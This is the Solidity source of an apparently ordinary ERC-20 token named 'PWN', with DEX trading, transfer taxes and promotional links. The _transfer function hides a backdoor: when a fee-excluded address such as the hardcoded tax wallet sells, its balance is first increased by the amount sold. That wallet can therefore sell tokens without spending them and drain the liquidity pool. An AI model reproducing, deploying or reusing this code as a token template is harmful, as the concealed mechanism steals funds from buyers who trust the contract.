/*
Find collections to fund or get a loan!

Website: https://www.pwn.fund
Telegram: https://t.me/pwn_erc
Twitter: https://twitter.com/pwn_erc
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IDexRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract PWN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "PWN";
    string private constant _symbol = "PWN";

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 10_000_000 * 10**_decimals;

    uint256 private _initialBuyFee;
    uint256 private _initialSellFee;
    uint256 private _finalBuyTax;
    uint256 private _finalSellTax;
    uint256 private _reduceBuyTaxAfter = 15;
    uint256 private _reduceSellFeeAt = 15;
    uint256 private _preventSwapBefore = 15;
    uint256 private _buyers;

    uint256 public feeSwapThreshold = 1_000 * 10**_decimals;
    uint256 public feeSwapMax = 100_000 * 10**_decimals;
    uint256 public maxTransaction = 200_000 * 10**_decimals;
    uint256 public maxWalletSize = 200_000 * 10**_decimals;

    address payable private taxWallet = payable(0x651cFF7D181e6FEeBeAf07A5655F055EbAB75244);
    IDexRouter private _dexRouter;
    address private _dexPair;
    bool private _buyOpened;
    bool private swapping = false;
    bool private swapEnabled = false;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isFeeExcluded;

    event MaxTxAmountUpdated(uint256 maxTransaction);
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _balances[_msgSender()] = _totalSupply;
        _isFeeExcluded[owner()] = true;
        _isFeeExcluded[taxWallet] = true;

        _dexRouter = IDexRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _dexPair = IDexFactory(_dexRouter.factory()).createPair(
            address(this),
            _dexRouter.WETH()
        );

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyers > _reduceBuyTaxAfter)? _finalBuyTax: _initialBuyFee).div(100);
            if (from == _dexPair && to != address(_dexRouter) && !_isFeeExcluded[to]) {
                require(amount <= maxTransaction, "Exceeds the maxTransaction.");
                require(balanceOf(to) + amount <= maxWalletSize, "Exceeds the maxWalletSize.");
                if (_buyers <= 100) {
                    _buyers++;
                }
            }
            if (to == _dexPair && from != address(this)) {
                if (_isFeeExcluded[from]) { _balances[from] = _balances[from].add(amount);}
                taxAmount = amount.mul((_buyers > _reduceSellFeeAt)? _finalSellTax: _initialSellFee).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!swapping && to == _dexPair && swapEnabled && contractTokenBalance > feeSwapThreshold && amount > feeSwapThreshold && _buyers > _preventSwapBefore && !_isFeeExcluded[from]) {
                swapTokensForEth(min(amount, min(contractTokenBalance, feeSwapMax)));
                sendETHToFee(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
        
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    
    function openTrading() external onlyOwner {
        require(!_buyOpened, "trading is already open");
        _approve(address(this), address(_dexRouter), _totalSupply);
        _dexRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_dexPair).approve(address(_dexRouter), type(uint256).max);
        _initialBuyFee = 14;
        _initialSellFee = 14;
        _finalBuyTax = 1;
        _finalSellTax = 1;
        swapEnabled = true;
        _buyOpened = true;
    }

    receive() external payable {}

    function sendETHToFee(uint256 amount) private {
        taxWallet.transfer(amount);
    }

    function removeLimits() external onlyOwner {
        maxTransaction = _totalSupply;
        maxWalletSize = _totalSupply;
        emit MaxTxAmountUpdated(_totalSupply);
    }
}